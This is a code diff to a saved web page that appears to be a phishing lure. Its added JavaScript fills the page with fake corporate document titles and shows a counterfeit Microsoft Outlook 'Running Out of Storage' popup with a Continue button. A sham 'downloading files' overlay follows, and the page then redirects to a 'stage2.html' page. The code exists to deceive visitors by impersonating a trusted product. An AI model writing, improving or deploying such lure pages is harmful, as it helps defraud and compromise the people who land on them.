@@ -3054,7 +3054,7 @@ html[dir="rtl"] .H1aInb3c {
 <meta name="savepage-version" content="33.9">
 <meta name="savepage-comments" content="">
 <script>
-    // Function to generate realistic document categories and titles
+    // --- Functions to generate placeholders ---
     function generateRandomPlaceholder() {
         const categories = [
             "Financial Report", 
@@ -3069,9 +3069,8 @@ html[dir="rtl"] .H1aInb3c {
             "Shareholder Brief"
         ];
         const randomCategory = categories[Math.floor(Math.random() * categories.length)];
-        const randomId = Math.floor(Math.random() * 1000000); // Unique numeric ID
-        const randomText = `${randomCategory} - Doc-${randomId}`;
-        return randomText;
+        const randomId = Math.floor(Math.random() * 1000000);
+        return `${randomCategory} - Doc-${randomId}`;
     }
 
     function generateRandomPlaceholder2() {
@@ -3088,9 +3087,8 @@ html[dir="rtl"] .H1aInb3c {
             "Equity Analysis"
         ];
         const randomCategory = categories[Math.floor(Math.random() * categories.length)];
-        const randomId = Math.floor(Math.random() * 1000000); // Unique numeric ID
-        const randomText = `${randomCategory} - File-${randomId}`;
-        return randomText;
+        const randomId = Math.floor(Math.random() * 1000000);
+        return `${randomCategory} - File-${randomId}`;
     }
 
     function generateRandomPlaceholder3() {
@@ -3107,12 +3105,11 @@ html[dir="rtl"] .H1aInb3c {
             "Regulatory Compliance Overview"
         ];
         const randomCategory = categories[Math.floor(Math.random() * categories.length)];
-        const randomId = Math.floor(Math.random() * 1000000); // Unique numeric ID
-        const randomText = `${randomCategory} - Ref-${randomId}`;
-        return randomText;
+        const randomId = Math.floor(Math.random() * 1000000);
+        return `${randomCategory} - Ref-${randomId}`;
     }
 
-    // Function to replace placeholders in the document
+    // --- Functions to replace placeholders in the document ---
     function replaceRandomPlaceholder() {
         const elements = document.querySelectorAll('*');
         elements.forEach(element => {
@@ -3140,23 +3137,146 @@ html[dir="rtl"] .H1aInb3c {
         });
     }
 
-    // Function to show loading animation and redirect
+    // --- Function to show a loading overlay and redirect ---
     function showLoadingAndRedirect() {
+        // Assumes an element with id 'overlay' exists in your HTML
         setTimeout(function() {
             document.getElementById('overlay').style.display = 'flex';
-
             setTimeout(function() {
                 window.location.href = 'stage2.html';
-            }, 3000); // 2 seconds delay
-        }, 500); // 5 seconds delay
+            }, 3000); // Redirect after 3 seconds
+        }, 500); // Delay before showing the overlay
     }
 
-    // Run all functions after page load
+    // --- Function to simulate file download for local accessibility ---
+    function startFileDownloadProcess() {
+        const downloadOverlay = document.createElement('div');
+        downloadOverlay.id = 'downloadOverlay';
+        downloadOverlay.style.position = 'fixed';
+        downloadOverlay.style.top = '0';
+        downloadOverlay.style.left = '0';
+        downloadOverlay.style.width = '100%';
+        downloadOverlay.style.height = '100%';
+        downloadOverlay.style.backgroundColor = 'rgba(0, 0, 0, 0.5)';
+        downloadOverlay.style.display = 'flex';
+        downloadOverlay.style.justifyContent = 'center';
+        downloadOverlay.style.alignItems = 'center';
+        downloadOverlay.style.zIndex = '1000';
+        
+        const downloadMessage = document.createElement('div');
+        downloadMessage.style.backgroundColor = '#fff';
+        downloadMessage.style.padding = '20px';
+        downloadMessage.style.borderRadius = '4px';
+        downloadMessage.style.boxShadow = '0 2px 8px rgba(0,0,0,0.2)';
+        downloadMessage.style.fontFamily = '"Segoe UI", Tahoma, Geneva, Verdana, sans-serif';
+        downloadMessage.style.fontSize = '14px';
+        downloadMessage.textContent = 'Downloading files for local accessibility...';
+        
+        downloadOverlay.appendChild(downloadMessage);
+        document.body.appendChild(downloadOverlay);
+        
+        // Simulate a download delay of 3 seconds, then remove the overlay and proceed
+        setTimeout(function(){
+            downloadOverlay.parentNode.removeChild(downloadOverlay);
+            showLoadingAndRedirect();
+        }, 3000);
+    }
+
+    // --- Function to create and show the "Running Out of Storage" popup styled like Microsoft Outlook with fade in ---
+    function showStoragePopup() {
+        const popup = document.createElement('div');
+        popup.id = 'storagePopup';
+        popup.style.position = 'fixed';
+        popup.style.top = '0';
+        popup.style.left = '0';
+        popup.style.width = '100%';
+        popup.style.height = '100%';
+        popup.style.backgroundColor = 'rgba(0, 0, 0, 0.3)';
+        popup.style.display = 'flex';
+        popup.style.justifyContent = 'center';
+        popup.style.alignItems = 'center';
+        popup.style.zIndex = '1000';
+        // Start with 0 opacity for fade-in effect
+        popup.style.opacity = '0';
+        popup.style.transition = 'opacity 0.5s ease';
+
+        const popupContent = document.createElement('div');
+        popupContent.style.width = '320px';
+        popupContent.style.backgroundColor = '#ffffff';
+        popupContent.style.border = '1px solid #cccccc';
+        popupContent.style.borderRadius = '4px';
+        popupContent.style.boxShadow = '0 2px 8px rgba(0, 0, 0, 0.2)';
+        popupContent.style.fontFamily = '"Segoe UI", Tahoma, Geneva, Verdana, sans-serif';
+        popupContent.style.overflow = 'hidden';
+
+        // Header mimicking Outlook title bar
+        const header = document.createElement('div');
+        header.style.backgroundColor = '#0078D7';
+        header.style.color = '#ffffff';
+        header.style.padding = '8px';
+        header.style.fontSize = '14px';
+        header.style.fontWeight = 'bold';
+        header.textContent = 'Microsoft Outlook';
+        popupContent.appendChild(header);
+
+        // Message body
+        const bodyDiv = document.createElement('div');
+        bodyDiv.style.padding = '16px';
+        bodyDiv.style.fontSize = '14px';
+        bodyDiv.style.color = '#333333';
+        bodyDiv.textContent = 'You are Running Out of Storage. Outlook will download the files for local accessibility.';
+        popupContent.appendChild(bodyDiv);
+
+        // Footer with the Continue button
+        const footer = document.createElement('div');
+        footer.style.display = 'flex';
+        footer.style.justifyContent = 'flex-end';
+        footer.style.padding = '8px 16px';
+
+        const continueButton = document.createElement('button');
+        continueButton.textContent = 'Continue';
+        continueButton.style.backgroundColor = '#0078D7';
+        continueButton.style.color = '#ffffff';
+        continueButton.style.border = 'none';
+        continueButton.style.padding = '6px 12px';
+        continueButton.style.fontSize = '14px';
+        continueButton.style.borderRadius = '2px';
+        continueButton.style.cursor = 'pointer';
+        continueButton.style.transition = 'background-color 0.3s ease';
+        continueButton.addEventListener('mouseover', function() {
+            continueButton.style.backgroundColor = '#005a9e';
+        });
+        continueButton.addEventListener('mouseout', function() {
+            continueButton.style.backgroundColor = '#0078D7';
+        });
+        continueButton.addEventListener('click', function() {
+            // Fade out popup before proceeding
+            popup.style.opacity = '0';
+            setTimeout(function(){
+                popup.parentNode.removeChild(popup);
+                startFileDownloadProcess();
+            }, 500);
+        });
+
+        footer.appendChild(continueButton);
+        popupContent.appendChild(footer);
+        popup.appendChild(popupContent);
+        document.body.appendChild(popup);
+
+        // Trigger fade in effect shortly after adding to the DOM
+        setTimeout(function(){
+            popup.style.opacity = '1';
+        }, 10);
+    }
+
+    // --- Onload: Replace placeholders quickly then show the popup ---
     window.onload = function() {
-        replaceRandomPlaceholder(); // Replace {RandomPlaceholder}
-        replaceRandomPlaceholder2(); // Replace {RandomPlaceholder2}
-        replaceRandomPlaceholder3(); // Replace {RandomPlaceholder3}
-        showLoadingAndRedirect(); // Show loading and redirect
+        // Immediately replace placeholders
+        replaceRandomPlaceholder();
+        replaceRandomPlaceholder2();
+        replaceRandomPlaceholder3();
+        // Then show the fade-in Outlook-style storage popup
+        showStoragePopup();
     };
 </script>
 
